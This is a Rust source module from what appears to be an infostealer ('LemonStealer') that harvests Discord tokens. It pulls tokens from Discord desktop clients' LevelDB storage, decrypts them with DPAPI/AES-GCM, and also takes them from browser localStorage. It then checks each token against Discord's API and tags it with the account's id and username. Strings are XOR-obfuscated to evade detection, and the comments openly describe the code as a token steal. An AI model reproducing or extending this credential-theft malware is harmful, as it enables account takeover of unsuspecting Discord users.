//! Wave 8 — Discord token steal (LemonStealer extension, beyond Go parity).
//!
//! Research distilled from public grabber repos (Milanoww, HyouKash, ALEHACKsp,
//! rcunov, playerhazu/Token-Decryptor, Lucifer-style C++ builders):
//!
//!   - App tokens live in the Electron (== Chromium) LevelDB at
//!     `%APPDATA%\<client>\Local Storage\leveldb\*.ldb|*.log`, either bare
//!     (`<userid>.<timestamp>.<hmac>` plaintext) or wrapped as
//!     `dQw4w9WgXcQ:<base64>` where the base64 is a Chromium v10 ciphertext
//!     (3B version + 12B nonce + ct+tag) sealed under the same AES-256-GCM key
//!     Chromium derives from `Local State`'s `os_crypt.encrypted_key` (DPAPI).
//!     Discord is Electron, so the existing DPAPI + GCM machinery decrypts it —
//!     no ABE injection needed for the token blob itself.
//!   - Web tokens are the browser's localStorage value for the discord origin —
//!     already harvested by LemonStealer's storage extractor (`StorageEntry`).
//!
//! Layering: `discord` sits above `browser` (LevelDB reader + Session) and
//! `crypto` (DPAPI/GCM reuse); consumed by `cli`. No cycles.

pub mod app;
pub mod web;

use std::path::PathBuf;

use hbd_core::StorageEntry;

/// One stolen token with its origin for the output row.
#[derive(Debug, Clone, PartialEq, serde::Serialize)]
pub struct DiscordToken {
    /// `app:<client>` or `web:<browser>/<profile>` — where it came from.
    pub source: String,
    /// Filesystem path (app: the leveldb dir / `.ldb`/`.log` file; web: the
    /// origin URL row) where the token was actually found.
    pub path: String,
    /// The decrypted (or as-found) token string.
    pub token: String,
    /// Discord user id, resolved by the validation probe (`/users/@me`).
    /// Empty until a probe succeeds.
    pub user_id: String,
    /// Discord username, resolved by the validation probe (`/users/@me`).
    /// Empty until a probe succeeds.
    pub username: String,
}

/// Response shape of `GET /users/@me` — fields we surface on the token.
#[derive(serde::Deserialize)]
struct Me {
    id: String,
    username: String,
}

impl DiscordToken {
    /// Builds a token with no account info yet (probe not run).
    fn found<A: Into<String>, B: Into<String>, C: Into<String>>(
        source: A,
        path: B,
        token: C,
    ) -> Self {
        DiscordToken {
            source: source.into(),
            path: path.into(),
            token: token.into(),
            user_id: String::new(),
            username: String::new(),
        }
    }
}

/// Scans both surfaces: installed app clients and web localStorage already
/// extracted from browsers. Deduplicates by token value, keeping first-seen
/// source order.
///
/// `web_profiles` feeds the raw-bytes fallback (`web::extract_raw`): each
/// `(label, profile_dir)` — a live tree the structured reader can mis-align,
/// so flattened file bytes get scanned too, mirroring the app path.
pub fn collect(
    storage: &[(String, StorageEntry)],
    web_profiles: &[(String, PathBuf)],
    app_data_dir: Option<&str>,
) -> Vec<DiscordToken> {
    let mut seen = std::collections::HashSet::new();
    let mut out = Vec::new();
    for tok in app::extract(app_data_dir)
        .into_iter()
        .chain(web::extract(storage))
        .chain(web::extract_raw(web_profiles))
    {
        if seen.insert(tok.token.clone()) {
            out.push(tok);
        }
    }
    out
}

/// Probes each token against `GET /api/v10/users/@me`, keeps only the ones
/// Discord accepts, and tags the survivors with the account info (`user_id`,
/// `username`) Discord returns. A transport failure keeps the token
/// (best-effort — the steal must not silently drop a good token because the
/// network hiccuped); a definite 401 invalidates it. The survivors are
/// deduplicated by token value.
pub fn validate(tokens: Vec<DiscordToken>) -> Vec<DiscordToken> {
    unique(
        tokens
            .into_iter()
            .filter_map(|mut t| {
                let header = format!("{}: {}", bypass::x!("Authorization", 0x3D), t.token);
                // Host decrypted at runtime from an XOR-const blob.
                let probe_url = format!(
                    "{}/api/v10/users/@me",
                    bypass::x!("https://discord.com", 0x6E)
                );
                match abi::http::get(&probe_url, Some(&header)) {
                    Ok((200, body)) => {
                        // Tag the account: id + name are the two fields the
                        // web/app surfaces care about. A body that doesn't
                        // parse still counts as valid — the probe itself 2xx'd.
                        if let Ok(me) = serde_json::from_slice::<Me>(&body) {
                            t.user_id = me.id;
                            t.username = me.username;
                        }
                        Some(t)
                    }
                    Ok((401, _)) => {
                        log::debug!(
                            "{} @ {}",
                            bypass::x!("discord: token invalid (401)", 0x5A),
                            t.path
                        );
                        None
                    }
                    Ok((status, _)) => {
                        log::debug!("discord: token probe HTTP {status} @ {}", t.path);
                        Some(t)
                    }
                    Err(e) => {
                        log::debug!("discord: token probe failed ({e}) @ {} — kept", t.path);
                        Some(t)
                    }
                }
            })
            .collect(),
    )
}

/// Removes tokens that share the same token value, keeping first-seen order.
/// [`validate`] applies this as its last step; the CLI writes whatever it's
/// handed, so this is the safety net on the output path (in addition to
/// [[collect]]'s own dedup).
fn unique(tokens: Vec<DiscordToken>) -> Vec<DiscordToken> {
    let mut seen = std::collections::HashSet::new();
    tokens
        .into_iter()
        .filter(|t| seen.insert(t.token.clone()))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn collect_dedupes_by_token() {
        let storage = vec![
            (
                "Chrome/Default".to_string(),
                StorageEntry {
                    is_meta: false,
                    url: "discord.com".into(),
                    key: "token".into(),
                    value: "MTAxMjM0NTY3ODkwMTIzNDU2Nw.abab12.THISISNOTAREALTOKENOFCOURSE".into(),
                },
            ),
            (
                "Discord app".to_string(),
                StorageEntry {
                    is_meta: false,
                    url: "discord.com".into(),
                    key: "x".into(),
                    value: format!("mfa.{}", "w".repeat(84)),
                },
            ),
        ];
        let toks = collect(&storage, &[], Some("Z:\\nonexistent\\roaming"));
        assert_eq!(2, toks.len());
    }

    #[test]
    fn me_response_parses_id_and_username() {
        let body = br#"{"id":"1131584321141080137","username":"cooluser"}"#;
        let me: Me = serde_json::from_slice(body).unwrap();
        assert_eq!("1131584321141080137", me.id);
        assert_eq!("cooluser", me.username);
    }

    #[test]
    fn unique_keeps_first_seen() {
        let mk = |token: &str| DiscordToken::found("app:x", "p", token);
        let toks = unique(vec![mk("t1"), mk("t2"), mk("t1"), mk("mfa.y")]);
        assert_eq!(3, toks.len());
        assert_eq!("t1", toks[0].token);
        assert_eq!("t2", toks[1].token);
    }
}
